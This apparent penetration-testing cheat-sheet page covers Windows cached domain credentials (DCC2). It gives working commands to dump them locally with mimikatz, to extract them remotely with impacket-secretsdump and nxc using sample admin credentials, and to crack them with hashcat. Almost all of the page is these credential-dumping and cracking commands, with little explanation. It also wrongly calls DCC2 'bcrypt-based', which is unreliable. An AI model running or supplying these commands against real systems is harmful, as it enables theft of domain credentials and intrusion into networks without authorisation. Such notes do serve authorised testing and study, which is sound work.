---
icon: object-ungroup
---

# Cached Domain Credentials (DCC2)

When a domain user logs in offline, Windows caches their credentials as DCC2 (mscash2) hash. Stored in `HKLM\\SECURITY\\Cache`. Cannot be used for PTH only cracking.

***

### Dump (Windows)

```powershell
# mimikatz
.\\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit"
```

***

### Dump (Linux — Remote)

```bash
impacket-secretsdump corp.local/admin:Password123@192.168.1.20
# Look for: $DCC2$ entries in output

# nxc
nxc smb 192.168.1.20 -u admin -p Password123 --lsa
```

***

### Crack DCC2 (Linux)

Format required: `$DCC2$10240#username#hash`

```bash
hashcat -m 2100 '$DCC2$10240#john#3407de6ff2f044ab21711a394d85f3b8' rockyou.txt

# Slow — DCC2 is bcrypt-based. GPU recommended.
```

***
